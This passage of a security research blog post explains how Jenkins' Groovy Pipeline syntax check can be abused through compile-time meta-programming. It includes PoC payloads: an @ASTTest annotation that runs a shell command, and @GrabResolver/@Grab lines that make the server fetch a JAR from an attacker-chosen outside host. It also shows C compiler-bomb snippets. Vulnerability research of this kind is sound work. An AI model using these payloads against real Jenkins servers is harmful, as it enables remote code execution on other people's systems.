&lt;p&gt;Here Jenkins validates the Pipeline with the method &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(â€¦)&lt;/a&gt;! It should be noted that this is just an AST parsing. Without running &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, any dangerous invocation wonâ€™t be executed! If you try to parse the following Groovy script, you get nothing :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the view of developers, the Pipeline can control Jenkins, so it must be dangerous and requires a strict permission check before every Pipeline invocation! However, this is just a simple syntax validation so the permission check here is more less than usual! Without any &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, itâ€™s just an AST parser and must be safe! This is what I thought when the first time I saw this validation. However, while I was writing the technique blog, Meta-Programming flashed into my mind!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;what-is-meta-programming&quot;&gt;What is Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Meta-Programming is a kind of programming concept! The idea of Meta-Programming is providing an abstract layer for programmers to consider the program in a different way, and makes the program more flexible and efficient! There is no clear definition of Meta-Programming. In general, both processing the program by itself and writing programs that operate on other programs(compiler, interpreter or preprocessorâ€¦) are Meta-Programming! The philosophy here is very profound and could even be a big subject on Programming Language!&lt;/p&gt;

&lt;p&gt;If it is still hard to understand, you can just regard &lt;code class=&quot;highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; as another Meta-Programming, which lets you operate the program on the fly. Although itâ€™s a little bit inaccurate, itâ€™s still a good metaphor for understanding! In software engineering, there are also lots of techniques related to Meta-Programming. For example:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C Macro&lt;/li&gt;
  &lt;li&gt;C++ Template&lt;/li&gt;
  &lt;li&gt;Java Annotation&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby is a Meta-Programming friendly language, even there are books for that)&lt;/li&gt;
  &lt;li&gt;DSL(Domain Specific Languages, such as &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; and &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When we are talking about Meta-Programming, we classify it into &lt;strong&gt;(1)compile-time&lt;/strong&gt; and &lt;strong&gt;(2)run-time Meta-Programming&lt;/strong&gt; according to the scope. Today, we focus on the compile-time Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Itâ€™s hard to explain Meta-Programming in non-native language. If you are interested, here are some materials! &lt;a href=&quot;https://en.wikipedia.org/wiki/Metaprogramming&quot;&gt;Wiki&lt;/a&gt;, &lt;a href=&quot;https://stackoverflow.com/questions/2565572/metaprogramming-self-explanatory-code-tutorials-articles-books/2566561#2566561&quot;&gt;Ref1&lt;/a&gt;, &lt;a href=&quot;http://cs.lmu.edu/~ray/notes/metaprogramming/&quot;&gt;Ref2&lt;/a&gt;&lt;/em&gt;&lt;br /&gt;
&lt;em&gt;P.S. I am not a programming language master, if there is anything incorrect or inaccurate, please forgive me &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;From the previous section we know Jenkins validates Pipeline by &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(â€¦)&lt;/a&gt; and learn that Meta-Programming can poke the parser during compile-time! Compiling(or parsing) is a hard work with lots of tough things and hidden features. So, the idea is, is there any side effect we can leverage?&lt;/p&gt;

&lt;p&gt;There are many simple cases which have proved Meta-Programming can make the program vulnerable, such as the macro expansion in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or the compiler resource bomb(make a 16GB ELF by just 18 bytes):&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;or calculating the Fibonacci number by compiler&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 55&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 6765&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 102334155&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the assembly language of compiled binary, we can make sure the result is calculated at compile-time, not run-time!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;g++ template.cpp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; template
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; intel &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; template
...
00000000000005fa &amp;lt;main&amp;gt;:
 5fa:   55                      push   rbp
 5fb:   48 89 e5                mov    rbp,rsp
 5fe:   c7 45 f4 37 00 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0xc],0x37
 605:   c7 45 f8 6d 1a 00 00    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],0x1a6d
 60c:   c7 45 &lt;span class=&quot;nb&quot;&gt;fc &lt;/span&gt;cb 7e 19 06    mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x4],0x6197ecb
 613:   b8 00 00 00 00          mov    eax,0x0
 618:   5d                      pop    rbp
 619:   c3                      ret
 61a:   66 0f 1f 44 00 00       nop    WORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rax+rax&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;1+0x0]
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For more examples, you can refer to the article &lt;a href=&quot;https://codegolf.stackexchange.com/questions/69189/build-a-compiler-bomb&quot;&gt;Build a Compiler Bomb&lt;/a&gt; on StackOverflow!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;first-attempt&quot;&gt;First Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Back to our exploitation, Pipeline is just a DSL built with Groovy, and Groovy is also a Meta-Programming friendly language. We start reading the Groovy official &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Meta-Programming manual&lt;/a&gt; to find some exploitation ways. In the section 2.1.9, we found the &lt;code class=&quot;highlighter-rouge&quot;&gt;@groovy.transform.ASTTest&lt;/code&gt; annotation. Here is its description:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; is a special AST transformation meant to help debugging other AST transformations or the Groovy compiler itself. It will let the developer â€œexploreâ€ the AST during compilation and &lt;strong&gt;perform assertions on the AST&lt;/strong&gt; rather than on the result of compilation. This means that this AST transformations gives access to the AST before the Bytecode is produced. &lt;code class=&quot;highlighter-rouge&quot;&gt;@ASTTest&lt;/code&gt; can be placed on any annotable node and requires two parameters:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What! &lt;strong&gt;perform assertions on the AST&lt;/strong&gt;? Isnâ€™t that what we want? Letâ€™s write a simple Proof-of-Concept in local environment first:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
@groovy.transform.ASTTest(value={
    assert java.lang.Runtime.getRuntime().exec(&quot;touch pwned&quot;)
})
def x
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;groovy poc.groovy
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;poc.groovy  pwned
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, it works! However, while reproducing this on the remote Jenkins, it shows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;unable to resolve class org.jenkinsci.plugins.workflow.libs.Library&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190219/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What the hell!!! Whatâ€™s wrong with that?&lt;/p&gt;

&lt;p&gt;With a little bit digging, we found the root cause. This is caused by the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! In order to reuse functions in Pipeline, Jenkins provides the feature that can import customized library into Pipeline! Jenkins will load this library before every executed Pipeline. As a result, the problem become lack of corresponding library in classPath during compile-time. Thatâ€™s why the error &lt;code class=&quot;highlighter-rouge&quot;&gt;unsable to resolve class&lt;/code&gt; occurs!&lt;/p&gt;

&lt;p&gt;How to fix this problem? Itâ€™s simple! Just go to &lt;a href=&quot;http://jenkins.local/pluginManager/&quot;&gt;Jenkins Plugin Manager&lt;/a&gt; and remove the &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Pipeline+Shared+Groovy+Libraries+Plugin&quot;&gt;Pipeline Shared Groovy Libraries Plugin&lt;/a&gt;! It can fix the problem and then we can execute arbitrary code without any error! But, this is not a good solution because this plugin is installed along with the Pipeline. Itâ€™s lame to ask administrator to remove the plugin for code execution! We stop digging this and try to find another way!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;second-attempt&quot;&gt;Second Attempt&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We continued reading the &lt;a href=&quot;http://groovy-lang.org/metaprogramming.html&quot;&gt;Groovy Meta-Programming manual&lt;/a&gt; and found another interesting annotation - &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;. There is no detailed information about &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; on the manual. However, we found another article - &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/documentation/grape.html&quot;&gt;Dependency management with Grape&lt;/a&gt; on search engine!&lt;/p&gt;

&lt;p&gt;Oh, from the article we know Grape is a built-in JAR dependency management in Groovy! It can help programmers import the library which are not in classPath. The usage looks like:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.springframework&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;spring-orm&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;3.2.5.RELEASE&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By using &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt; annotation, it can import the JAR file which is not in classPath during compile-time automatically! If you just want to bypass the Pipeline sandbox via a valid credential and the permission of Pipeline execution, thatâ€™s enough. You can follow the &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt; proveded by &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; to execute arbitrary commands!&lt;/p&gt;

&lt;p&gt;However, without a valid credential and &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; method, this is just an AST parser and you even canâ€™t control files on remote server. So, what can we do? By diving into more about &lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;, we found another interesting annotation - &lt;code class=&quot;highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;http://maven.restlet.org/&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;1.1.6&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you are smart enough, you would like to change the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; parameter to a malicious website! Letâ€™s try this in local environment:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
@GrabResolver(name=&#39;restlet&#39;, root=&#39;http://orange.tw/&#39;)
@Grab(group=&#39;org.restlet&#39;, module=&#39;org.restlet&#39;, version=&#39;1.1.6&#39;)
import org.restlet
&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Wow, it works! Now, we believe we can make Jenkins import any malicious library by Grape! However, the next problem is, how to get code execution?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-way-to-code-execution&quot;&gt;The Way to Code Execution&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;In the exploitation, the target is always escalating the read primitive or write primitive to code execution! From the previous section, we can write malicious JAR file into remote Jenkins server by Grape. However, the next problem is how to execute code?&lt;/p&gt;

&lt;p&gt;By diving into &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape implementation on Groovy&lt;/a&gt;, we realized the library fetching is done by the class &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt;! We started to find is there any way we can leverage, and we noticed an interesting method &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(â€¦)&lt;/a&gt;!&lt;/p&gt;

